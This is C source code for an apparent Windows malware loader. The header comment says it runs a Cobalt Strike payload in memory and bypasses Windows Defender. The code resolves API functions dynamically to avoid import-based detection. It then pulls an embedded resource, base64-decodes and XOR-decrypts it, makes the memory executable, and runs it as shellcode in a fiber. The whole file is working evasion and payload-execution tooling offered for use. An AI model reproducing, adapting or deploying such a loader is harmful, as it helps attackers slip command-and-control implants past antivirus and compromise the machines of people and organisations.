/**
Main functionality for loading Cobalt Strike payload in memory
using Fiber: "https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber".
CS Payload embedded as resource that needs to be decode and decrypted, before being executed.
This loader inspired from Sektor7 Maldev Intermediate course and currently bypass Windows Defender static and behaviour detection.
**/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wincrypt.h>
#include "resolve_eat.h"
#include "resource.h"
#pragma comment (lib, "Crypt32.lib")

typedef HRSRC(WINAPI* tFindResourceA)(
	HMODULE hModule,
	LPCSTR lpName,
	LPCSTR lpType
	);

typedef HGLOBAL(WINAPI* tLoadResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef LPVOID(WINAPI* tLockResource)(
	HGLOBAL hResData
	);

typedef DWORD(WINAPI* tSizeofResource)(
	HMODULE hModule,
	HRSRC hResInfo
	);

typedef LPVOID(WINAPI* tVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	);

typedef BOOL(WINAPI* tVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect
	);

void Exor(char* data, size_t data_len) {

	for (int i = 0; i < data_len; i++) {
		data[i] = data[i] ^ 123;
	}
}

int Base64Decode(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinaryA((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE*)dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;

	return(outLen);
}

VOID WINAPI start(VOID){

	LPVOID mem_loc;
	BOOL vprv;
	DWORD oldprotect = 0;
	HRSRC hRsrc = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pTaskAddress = NULL;
	unsigned int sTaskSize = NULL;

	tVirtualAlloc fpVirtualAlloc = (tVirtualAlloc)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "VirtualAlloc");
	tVirtualProtect fpVirtualProtect = (tVirtualProtect)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "VirtualProtect");
	tFindResourceA fpFindResourceA = (tFindResourceA)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "FindResourceA");
	tLoadResource fpLoadResource = (tLoadResource)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "LoadResource");
	tLockResource fpLockResource = (tLockResource)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "LockResource");
	tSizeofResource fpSizeofResource = (tSizeofResource)GetFuncAddr(GetModHdl(L"KERNEL32.DLL"), "SizeofResource");

	hRsrc = fpFindResourceA(NULL, MAKEINTRESOURCEA(IDR_RCDATA1), (LPCSTR) RT_RCDATA);
	if (hRsrc == NULL) {
		return;
	}

	hGlobal = fpLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		return;
	}

	pTaskAddress = fpLockResource(hGlobal);
	if (pTaskAddress == NULL) {
		return;
	}

	sTaskSize = fpSizeofResource(NULL, hRsrc);
	if (sTaskSize == NULL) {
		return;
	}

	PVOID startFiber = ConvertThreadToFiber(NULL);

	mem_loc = fpVirtualAlloc(0, sTaskSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	Base64Decode((const BYTE*)pTaskAddress, sTaskSize, (char*)mem_loc, sTaskSize);

	Exor((char*)mem_loc, sTaskSize);

	vprv = fpVirtualProtect(mem_loc, sTaskSize, PAGE_EXECUTE_READ, &oldprotect);

	PVOID taskFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)mem_loc, NULL);

	if (taskFiber != NULL) {
		SwitchToFiber(taskFiber);
	}
}